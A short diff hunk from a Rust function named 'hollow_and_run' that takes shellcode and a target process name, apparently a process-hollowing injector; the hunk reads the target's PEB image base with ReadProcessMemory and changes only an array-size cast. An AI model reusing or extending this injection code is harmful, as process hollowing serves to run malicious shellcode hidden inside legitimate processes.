@@ -70,7 +70,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
     let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
-    let mut address_buffer = [0; POINTER_SIZE as usize];
+    let mut address_buffer = [0; POINTER_SIZE];
     let read_result = unsafe { ReadProcessMemory(process_handle, image_base_address as *const c_void, address_buffer.as_mut_ptr() as *mut c_void, address_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
         panic!("Could not read the address of the code base with ReadProcessMemory");
